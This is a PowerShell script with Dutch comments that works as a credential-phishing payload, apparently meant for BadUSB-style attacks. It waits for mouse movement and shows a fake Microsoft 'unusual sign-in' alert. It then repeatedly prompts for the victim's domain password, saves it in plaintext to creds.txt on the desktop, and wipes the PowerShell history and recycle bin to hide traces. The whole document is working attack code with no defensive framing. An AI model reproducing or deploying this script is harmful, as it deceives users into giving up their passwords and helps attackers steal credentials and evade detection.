# Dynamisch pad voor het bureaublad van de huidige gebruiker
$DesktopPath = [Environment]::GetFolderPath('Desktop')
$FileName = "creds.txt"
$FullPath = Join-Path -Path $DesktopPath -ChildPath $FileName

# Controleer of creds.txt al bestaat
if (Test-Path -Path $FullPath) {
    Write-Host "Het bestand 'creds.txt' bestaat al. Het script wordt niet verder uitgevoerd."
    exit
}

# Functie: Vraag om gebruikersreferenties
function Get-Creds {
    Add-Type -AssemblyName System.Windows.Forms
    while ($true) {
        $cred = $host.ui.PromptForCredential(
            'Mislukte authenticatie', 
            'Voer uw referenties in om verder te gaan.', 
            [Environment]::UserDomainName + '\' + [Environment]::UserName, 
            [Environment]::UserDomainName
        )

        if (![string]::IsNullOrWhiteSpace($cred.Password)) {
            return @{
                Gebruikersnaam = $cred.UserName
                Wachtwoord = $cred.GetNetworkCredential().Password
                Domein = $cred.GetNetworkCredential().Domain
            }
        }
        else {
            [System.Windows.Forms.MessageBox]::Show("Het wachtwoord mag niet leeg zijn. Probeer het opnieuw.")
        }
    }
}

# Functie: Wacht tot er muisbeweging wordt gedetecteerd
function Wait-ForMouseMovement {
    Add-Type -AssemblyName System.Windows.Forms
    $originalPosition = [System.Windows.Forms.Cursor]::Position

    while ($true) {
        Start-Sleep -Milliseconds 200
        $currentPosition = [System.Windows.Forms.Cursor]::Position
        if (($currentPosition.X -ne $originalPosition.X) -or ($currentPosition.Y -ne $originalPosition.Y)) {
            break
        }
    }
}

# Functie: Zet CapsLock uit indien nodig
function Caps-Off {
    Add-Type -AssemblyName System.Windows.Forms
    if ([System.Windows.Forms.Control]::IsKeyLocked('CapsLock')) {
        $key = New-Object -ComObject WScript.Shell
        $key.SendKeys('{CapsLock}')
    }
}

# Scriptuitvoering
Wait-ForMouseMovement  # Wacht tot er muisbeweging wordt gedetecteerd
Start-Sleep -Seconds 5 # Voeg 5 seconden vertraging toe
Caps-Off               # Zorg dat CapsLock uitstaat
Add-Type -AssemblyName System.Windows.Forms

# Toon pop-up na de vertraging
[System.Windows.Forms.MessageBox]::Show("Ongebruikelijke aanmelding gedetecteerd. Verifieer uw Microsoft-account.")

$creds = Get-Creds

# Bewaar de verzamelde gegevens op het bureaublad
try {
    $creds | Out-File -FilePath $FullPath -Encoding UTF8 -Append
    Write-Host "Referenties zijn opgeslagen in $FullPath"
} catch {
    Write-Host "Er is een fout opgetreden bij het opslaan van de referenties: $($_.Exception.Message)"
}

# Schoonmaakacties
try {
    Remove-Item (Get-PSReadlineOption).HistorySavePath -ErrorAction SilentlyContinue
    Clear-RecycleBin -Force -ErrorAction SilentlyContinue
} catch {
    Write-Host "Schoonmaakacties zijn overgeslagen: $($_.Exception.Message)"
}
